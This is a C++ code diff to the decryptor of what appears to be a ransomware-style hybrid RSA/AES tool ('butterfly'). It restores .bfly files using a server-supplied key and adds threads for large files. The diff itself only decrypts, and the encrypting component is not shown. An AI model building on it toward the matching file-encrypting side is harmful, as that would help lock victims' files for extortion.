@@ -29,8 +29,12 @@ void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFro
     decryptCPrivateRSA(pkeyFromServer, butterfly::ENC_CPRIVATERSA_FILENAME);
 
     // Decrypt the AESKey.bin file and get AESKey and AESIV
-    std::string aesk, aesiv;
-    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, aesk, aesiv);
+    std::string aeskey, aesiv;
+    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, aeskey, aesiv);
+
+    // Set static AESKey and AESIV
+    _aesDecryptor->setAESKey(aeskey);
+    _aesDecryptor->setAESIv(aesiv);
 
     // Get all files from provided directory path
     auto files = DirectoryIterator::getAllFiles(dirPath);
@@ -41,12 +45,23 @@ void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFro
         // Check if the provided file path has the .bfly extension
         if ( DirectoryIterator::getFileExtension(file) == butterfly::ENC_BFLY_FILE_ENDING )
         {
-            std::string filepath = file.string();
-            decryptFileWithAES(filepath, aesk, aesiv);
+            // Compare file size with the MAX FILE SIZE
+            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE)
+            {
+                LOG_TRACE("Spawn a new decryption thread for file: " << file.string());
+                spawnThread(file.string());
+            } else
+            {
+                decryptFileWithAES(file.string());
+            }
         }
 
     }
 
+    // Join all threads which were spawned for huge file decryption
+    joinThreads();
+
+    // Remove decryption helper files
     removeDecryptedFiles();
 }
 
@@ -132,11 +147,8 @@ void Decryptor::decryptAESKeyPair(const std::string &filepathAESKey, std::string
 
 }
 
-void Decryptor::decryptFileWithAES(const std::string &filepath, std::string &aeskey, std::string &aesiv)
+void Decryptor::decryptFileWithAES(const std::string &filepath)
 {
-    // Set AESKey and AESIV
-    _aesDecryptor->setAESKey(aeskey);
-    _aesDecryptor->setAESIv(aesiv);
 
     try
     {
@@ -150,6 +162,21 @@ void Decryptor::decryptFileWithAES(const std::string &filepath, std::string &aes
         throw DecryptorException(e.what());
     }
 
+}
+
+void Decryptor::spawnThread(const std::string &filepath)
+{
+    std::thread t(&Decryptor::decryptFileWithAES, this, filepath);
+    _threads.push_back(std::move(t));
+}
+
+void Decryptor::joinThreads()
+{
+    for (auto &t: _threads)
+    {
+        if (t.joinable())
+            t.join();
+    }
 }
 
 } // namespace hybrid
